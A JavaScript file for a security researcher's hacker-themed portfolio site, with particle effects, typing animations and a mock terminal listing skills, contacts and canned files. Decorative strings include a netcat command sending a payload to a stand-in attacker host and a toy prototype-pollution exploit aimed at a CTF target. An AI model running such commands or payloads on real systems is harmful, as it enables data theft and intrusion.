// Advanced JavaScript with Particle System, Interactive Terminal, and Sophisticated Animations

// Particle System
class ParticleSystem {
    constructor(canvas) {
        this.canvas = canvas;
        this.ctx = canvas.getContext('2d');
        this.particles = [];
        this.particleCount = 100;
        this.connections = [];
        this.mouse = { x: 0, y: 0 };
        
        this.resize();
        this.init();
        window.addEventListener('resize', () => this.resize());
        canvas.addEventListener('mousemove', (e) => {
            this.mouse.x = e.clientX;
            this.mouse.y = e.clientY;
        });
    }
    
    resize() {
        this.canvas.width = window.innerWidth;
        this.canvas.height = window.innerHeight;
    }
    
    init() {
        this.particles = [];
        for (let i = 0; i < this.particleCount; i++) {
            this.particles.push({
                x: Math.random() * this.canvas.width,
                y: Math.random() * this.canvas.height,
                vx: (Math.random() - 0.5) * 0.5,
                vy: (Math.random() - 0.5) * 0.5,
                radius: Math.random() * 2 + 1
            });
        }
    }
    
    animate() {
        this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
        
        // Update and draw particles
        this.particles.forEach((particle, i) => {
            particle.x += particle.vx;
            particle.y += particle.vy;
            
            if (particle.x < 0 || particle.x > this.canvas.width) particle.vx *= -1;
            if (particle.y < 0 || particle.y > this.canvas.height) particle.vy *= -1;
            
            // Draw particle
            this.ctx.beginPath();
            this.ctx.arc(particle.x, particle.y, particle.radius, 0, Math.PI * 2);
            this.ctx.fillStyle = 'rgba(0, 255, 136, 0.5)';
            this.ctx.fill();
            
            // Draw connections
            this.particles.forEach((p2, j) => {
                if (i !== j) {
                    const dx = particle.x - p2.x;
                    const dy = particle.y - p2.y;
                    const dist = Math.sqrt(dx * dx + dy * dy);
                    
                    if (dist < 120) {
                        this.ctx.beginPath();
                        this.ctx.moveTo(particle.x, particle.y);
                        this.ctx.lineTo(p2.x, p2.y);
                        this.ctx.strokeStyle = `rgba(0, 255, 136, ${0.2 * (1 - dist / 120)})`;
                        this.ctx.lineWidth = 0.5;
                        this.ctx.stroke();
                    }
                }
            });
            
            // Mouse interaction
            const dx = this.mouse.x - particle.x;
            const dy = this.mouse.y - particle.y;
            const dist = Math.sqrt(dx * dx + dy * dy);
            
            if (dist < 150) {
                particle.vx += dx * 0.0001;
                particle.vy += dy * 0.0001;
            }
        });
        
        requestAnimationFrame(() => this.animate());
    }
}

// Loading Animation
function initLoading() {
    const loadingScreen = document.querySelector('.loading-screen');
    const progress = document.querySelector('.loading-progress');
    const percent = document.querySelector('.loading-percent');
    const status = document.querySelector('.loading-status');
    
    const steps = [
        'LOADING MODULES',
        'INITIALIZING EXPLOITS',
        'COMPILING PAYLOADS',
        'CONNECTING TO TARGETS',
        'READY'
    ];
    
    let currentStep = 0;
    let currentPercent = 0;
    
    const interval = setInterval(() => {
        currentPercent += Math.random() * 15;
        if (currentPercent > 100) currentPercent = 100;
        
        percent.textContent = Math.floor(currentPercent) + '%';
        
        if (currentPercent >= (currentStep + 1) * 20 && currentStep < steps.length - 1) {
            currentStep++;
            status.textContent = steps[currentStep];
        }
        
        if (currentPercent >= 100) {
            clearInterval(interval);
            setTimeout(() => {
                loadingScreen.classList.add('hidden');
            }, 500);
        }
    }, 100);
}

// ASCII Art Generator
function generateASCII() {
    const ascii = `
   ___   ___       _____                _       
  / _ \\ / _ \\_  __/ ____|__ _ _ __   ___| | ___  
 | | | | | | \\ \\/ / |   / _\` | '_ \\ / _ \\ |/ _ \\ 
 | |_| | |_| |>  <| |__| (_| | | | |  __/ | (_) |
  \\___/ \\___//_/\\_\\\\____\\__,_|_| |_|\\___|_|\\___/ 
`;
    const asciiElement = document.querySelector('.ascii-art');
    if (asciiElement) {
        asciiElement.textContent = ascii;
    }
}

// Typing Animation
const typingTexts = [
    'cat /var/log/exploits.log',
    'sudo ./exploit.sh --target remote',
    'python3 scanner.py --deep',
    'gcc -o pwn exploit.c && ./pwn',
    'nc attacker.io 1337 < payload.bin'
];

let textIndex = 0;
let charIndex = 0;
let isDeleting = false;

function typeWriter() {
    const typingElement = document.querySelector('.typing-text');
    if (!typingElement) return;
    
    const currentText = typingTexts[textIndex];
    const typingSpeed = isDeleting ? 30 : 80;
    
    if (!isDeleting && charIndex <= currentText.length) {
        typingElement.textContent = currentText.substring(0, charIndex);
        charIndex++;
        setTimeout(typeWriter, typingSpeed);
    } else if (isDeleting && charIndex >= 0) {
        typingElement.textContent = currentText.substring(0, charIndex);
        charIndex--;
        setTimeout(typeWriter, typingSpeed);
    } else if (!isDeleting && charIndex === currentText.length + 1) {
        setTimeout(() => {
            isDeleting = true;
            typeWriter();
        }, 2000);
    } else if (isDeleting && charIndex === 0) {
        isDeleting = false;
        textIndex = (textIndex + 1) % typingTexts.length;
        setTimeout(typeWriter, 500);
    }
}

// Subtitle Typewriter
const subtitles = [
    'CTF Player • Source Code Auditor • 0day Hunter',
    'Breaking Things Since 2025',
    'Prototype Pollution Specialist',
    'Heap Feng Shui Master'
];

let subtitleIndex = 0;
let subtitleCharIndex = 0;

function typeSubtitle() {
    const element = document.querySelector('.typewriter-subtitle');
    if (!element) return;
    
    const currentSubtitle = subtitles[subtitleIndex];
    
    if (subtitleCharIndex < currentSubtitle.length) {
        element.textContent = currentSubtitle.substring(0, subtitleCharIndex + 1);
        subtitleCharIndex++;
        setTimeout(typeSubtitle, 100);
    } else {
        setTimeout(() => {
            subtitleCharIndex = 0;
            subtitleIndex = (subtitleIndex + 1) % subtitles.length;
            element.textContent = '';
            setTimeout(typeSubtitle, 500);
        }, 3000);
    }
}

// Counter Animation
function animateCounter(element, target, duration = 2000) {
    const start = 0;
    const increment = target / (duration / 16);
    let current = start;
    
    const timer = setInterval(() => {
        current += increment;
        if (current >= target) {
            element.textContent = target;
            clearInterval(timer);
        } else {
            element.textContent = Math.floor(current);
        }
    }, 16);
}

// Custom Cursor
function initCustomCursor() {
    const cursorDot = document.querySelector('.cursor-dot');
    const cursorOutline = document.querySelector('.cursor-outline');
    
    if (!cursorDot || !cursorOutline) return;
    
    let mouseX = 0, mouseY = 0;
    let outlineX = 0, outlineY = 0;
    
    document.addEventListener('mousemove', (e) => {
        mouseX = e.clientX;
        mouseY = e.clientY;
        
        cursorDot.style.left = mouseX - 4 + 'px';
        cursorDot.style.top = mouseY - 4 + 'px';
        cursorDot.style.opacity = '1';
        cursorOutline.style.opacity = '0.5';
    });
    
    document.addEventListener('mouseleave', () => {
        cursorDot.style.opacity = '0';
        cursorOutline.style.opacity = '0';
    });
    
    function animateOutline() {
        outlineX += (mouseX - outlineX) * 0.15;
        outlineY += (mouseY - outlineY) * 0.15;
        
        cursorOutline.style.left = outlineX - 15 + 'px';
        cursorOutline.style.top = outlineY - 15 + 'px';
        
        requestAnimationFrame(animateOutline);
    }
    
    animateOutline();
    
    // Cursor effects on interactive elements
    const interactiveElements = document.querySelectorAll('a, button, .writeup-card, .tool-card, .contact-card');
    interactiveElements.forEach(el => {
        el.addEventListener('mouseenter', () => {
            cursorOutline.style.transform = 'scale(1.5)';
            cursorDot.style.transform = 'scale(1.5)';
        });
        el.addEventListener('mouseleave', () => {
            cursorOutline.style.transform = 'scale(1)';
            cursorDot.style.transform = 'scale(1)';
        });
    });
}

// Interactive Terminal
class InteractiveTerminal {
    constructor() {
        this.input = document.getElementById('terminal-input');
        this.output = document.getElementById('terminal-output');
        this.commands = {
            help: this.showHelp.bind(this),
            whoami: this.whoami.bind(this),
            clear: this.clear.bind(this),
            skills: this.skills.bind(this),
            github: this.github.bind(this),
            medium: this.medium.bind(this),
            contact: this.contact.bind(this),
            ls: this.ls.bind(this),
            cat: this.cat.bind(this)
        };
        
        this.init();
    }
    
    init() {
        if (!this.input) return;
        
        this.input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                this.processCommand(this.input.value.trim());
                this.input.value = '';
            }
        });
        
        document.getElementById('clear-terminal').addEventListener('click', () => {
            this.clear();
        });
    }
    
    processCommand(cmd) {
        const parts = cmd.split(' ');
        const command = parts[0].toLowerCase();
        const args = parts.slice(1);
        
        this.addLine(`root@00xCanelo:~$ ${cmd}`, 'prompt');
        
        if (this.commands[command]) {
            this.commands[command](args);
        } else if (cmd === '') {
            // Empty command, do nothing
        } else {
            this.addLine(`Command not found: ${command}. Type 'help' for available commands.`, 'error');
        }
        
        this.output.scrollTop = this.output.scrollHeight;
    }
    
    addLine(text, type = 'text') {
        const line = document.createElement('div');
        line.className = `terminal-line terminal-${type}`;
        
        if (type === 'prompt') {
            const prompt = document.createElement('span');
            prompt.className = 'terminal-prompt';
            prompt.textContent = text;
            line.appendChild(prompt);
        } else {
            const span = document.createElement('span');
            span.className = `terminal-${type}`;
            span.textContent = text;
            line.appendChild(span);
        }
        
        this.output.appendChild(line);
    }
    
    showHelp() {
        const commands = [
            'Available commands:',
            '  help     - Show this help message',
            '  whoami   - Display information about 00xCanelo',
            '  skills   - List technical skills and expertise',
            '  github   - Open GitHub profile',
            '  medium   - Open Medium blog',
            '  contact  - Show contact information',
            '  ls       - List available files',
            '  cat      - Read a file (usage: cat <filename>)',
            '  clear    - Clear the terminal'
        ];
        
        commands.forEach(cmd => this.addLine(cmd, 'text'));
    }
    
    whoami() {
        const info = [
            '╔══════════════════════════════════════════════════════╗',
            '║              00xCanelo - Security Researcher          ║',
            '╚══════════════════════════════════════════════════════╝',
            '',
            'Senior Offensive Security Researcher',
            'Specializing in:',
            '  • Web Application Exploitation',
            '  • Binary Exploitation & Reverse Engineering',
            '  • Source Code Auditing',
            '  • Cryptographic Vulnerabilities',
            '',
            'CTF Player | Tool Developer | Technical Writer',
            'GitHub: https://github.com/00xCanelo',
            'Medium: https://medium.com/@00xCanelo'
        ];
        
        info.forEach(line => this.addLine(line, 'text'));
    }
    
    skills() {
        const skills = [
            '╔══════════════════════════════════════════════════════╗',
            '║                  Technical Skills                     ║',
            '╚══════════════════════════════════════════════════════╝',
            '',
            '[Web Exploitation]',
            '  ▹ Prototype Pollution & Gadget Chain Discovery',
            '  ▹ Template Injection (SSTI)',
            '  ▹ SQL/NoSQL Injection',
            '  ▹ XSS, CSRF, XXE',
            '',
            '[Binary Exploitation]',
            '  ▹ Heap Exploitation & Feng Shui',
            '  ▹ Use-After-Free (UAF)',
            '  ▹ Type Confusion',
            '  ▹ ROP Chains & Stack Pivoting',
            '',
            '[Cryptography]',
            '  ▹ Lattice-based Attacks (LLL, Coppersmith)',
            '  ▹ Padding Oracle Attacks',
            '  ▹ Side-Channel Analysis',
            '  ▹ Protocol Implementation Flaws',
            '',
            '[Tools & Languages]',
            '  ▹ Python, Rust, C/C++, JavaScript',
            '  ▹ IDA Pro, Ghidra, GDB, Frida',
            '  ▹ Burp Suite, ZAP, Custom Tools'
        ];
        
        skills.forEach(line => this.addLine(line, 'text'));
    }
    
    github() {
        this.addLine('Opening GitHub profile...', 'text');
        window.open('https://github.com/00xCanelo', '_blank');
    }
    
    medium() {
        this.addLine('Opening Medium blog...', 'text');
        window.open('https://medium.com/@00xCanelo', '_blank');
    }
    
    contact() {
        const contact = [
            '╔══════════════════════════════════════════════════════╗',
            '║                  Contact Information                  ║',
            '╚══════════════════════════════════════════════════════╝',
            '',
            'GitHub:  https://github.com/00xCanelo',
            'Medium:  https://medium.com/@00xCanelo',
            'Email:   00xcanelo@security.com',
            'Twitter: @00xCanelo',
            '',
            'Open for:',
            '  • Security Research Collaboration',
            '  • CTF Team Invitations',
            '  • Technical Writing Opportunities',
            '  • Vulnerability Disclosure'
        ];
        
        contact.forEach(line => this.addLine(line, 'text'));
    }
    
    ls() {
        const files = [
            'exploit.py          crypto_attack.sage  pwn.c',
            'scanner.sh          writeup.md          tools/',
            'payloads/           research/           ctf_solutions/'
        ];
        
        files.forEach(line => this.addLine(line, 'text'));
    }
    
    cat(args) {
        if (args.length === 0) {
            this.addLine('Usage: cat <filename>', 'error');
            return;
        }
        
        const filename = args[0];
        const files = {
            'exploit.py': [
                '#!/usr/bin/env python3',
                'import requests',
                '',
                'def exploit(target_url):',
                '    payload = {',
                '        "__proto__": {',
                '            "shell": "calc.exe"',
                '        }',
                '    }',
                '    ',
                '    r = requests.post(target_url, json=payload)',
                '    if "RCE" in r.text:',
                '        print("[+] Exploitation successful!")',
                '',
                'if __name__ == "__main__":',
                '    exploit("http://target.ctf")'
            ],
            'writeup.md': [
                '# CTF Challenge Writeup',
                '',
                '## Challenge: Prototype Pollution to RCE',
                '',
                '### Reconnaissance',
                'The application is a Node.js Express app...',
                '',
                '### Exploitation',
                '1. Identify prototype pollution vector',
                '2. Find gadget chain',
                '3. Achieve RCE via template injection',
                '',
                '### Payload',
                '```json',
                '{"__proto__":{"shell":"calc"}}',
                '```'
            ]
        };
        
        if (files[filename]) {
            files[filename].forEach(line => this.addLine(line, 'text'));
        } else {
            this.addLine(`cat: ${filename}: No such file or directory`, 'error');
        }
    }
    
    clear() {
        this.output.innerHTML = '';
        this.addLine('root@00xCanelo:~$', 'prompt');
        this.addLine('Terminal cleared. Type "help" for available commands.', 'text');
    }
}

// Smooth Scroll
function initSmoothScroll() {
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                const navHeight = document.querySelector('.nav').offsetHeight;
                const targetPosition = target.offsetTop - navHeight;
                
                window.scrollTo({
                    top: targetPosition,
                    behavior: 'smooth'
                });
            }
        });
    });
}

// Card Hover Glow Effect
function initCardGlow() {
    const cards = document.querySelectorAll('.writeup-card, .tool-card');
    
    cards.forEach(card => {
        card.addEventListener('mousemove', (e) => {
            const rect = card.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            
            card.style.setProperty('--mouse-x', `${x}%`);
            card.style.setProperty('--mouse-y', `${y}%`);
        });
    });
}

// Scroll Reveal
function initScrollReveal() {
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
                
                // Animate stats when hero is visible
                if (entry.target.classList.contains('hero')) {
                    const statNumbers = document.querySelectorAll('.stat-number');
                    statNumbers.forEach(stat => {
                        const target = parseInt(stat.getAttribute('data-target'));
                        animateCounter(stat, target);
                    });
                }
            }
        });
    }, {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    });
    
    const sections = document.querySelectorAll('section');
    sections.forEach(section => observer.observe(section));
}

// Initialize Everything
function init() {
    // Loading animation
    initLoading();
    
    // Generate ASCII art
    generateASCII();
    
    // Particle system
    const canvas = document.getElementById('particle-canvas');
    if (canvas) {
        const particleSystem = new ParticleSystem(canvas);
        particleSystem.animate();
    }
    
    // Typing animations
    typeWriter();
    typeSubtitle();
    
    // Custom cursor
    initCustomCursor();
    
    // Terminal
    new InteractiveTerminal();
    
    // Navigation and scroll
    initSmoothScroll();
    initScrollReveal();
    
    // Card effects
    initCardGlow();
    
    // Floating code animation is CSS-based, no JS needed
}

// Run when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}
